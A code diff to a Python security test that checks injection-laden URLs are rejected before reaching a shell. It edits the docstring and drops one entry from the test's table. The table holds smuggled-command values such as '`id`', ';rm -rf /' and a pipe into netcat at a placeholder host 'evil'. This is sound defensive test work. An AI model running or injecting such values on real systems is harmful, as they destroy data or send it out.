@@ -96,7 +96,11 @@ def test_surface_argument_injection_never_reaches_a_shell() -> None:
     the table of hostile inputs is rejected with the user-error code. The
     engine calls yt-dlp's Python API rather than building a command line;
     this guard keeps that designed-out property from regressing: no module
-    may spawn a shell, and the engine may not spawn anything at all."""
+    may spawn a shell, and the engine may not spawn anything at all.
+
+    A bare ``&`` is absent from the table on purpose: it is URL data
+    (ticket #26), and the source scan below is what proves no shell exists
+    to interpret it."""
     hostile = (
         "-rf",
         "--verbose",
@@ -104,7 +108,6 @@ def test_surface_argument_injection_never_reaches_a_shell() -> None:
         "https://ex.com/`id`",
         "https://ex.com/x;rm -rf /",
         "https://ex.com/ | nc evil 1",
-        "https://ex.com/x && echo pwned",
         "https://ex.com/x > file",
     )
     for link in hostile:
